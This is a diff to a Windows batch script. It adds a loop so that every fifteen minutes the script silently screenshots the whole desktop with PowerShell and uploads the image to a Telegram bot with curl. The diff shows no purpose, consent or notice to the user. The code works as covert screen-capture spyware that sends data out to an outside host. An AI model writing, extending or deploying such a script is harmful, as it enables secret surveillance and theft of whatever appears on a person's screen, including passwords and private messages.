@@ -1,5 +1,7 @@
 @echo off
 
+:loop
+
 timeout /t 900 /nobreak >nul
 
 PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size); $Bitmap.Save('%USERPROFILE%\Downloads\screenshot.png');"
@@ -28,3 +30,4 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
 
 echo Message sent to chat ID %CHAT_ID%
 
+goto loop
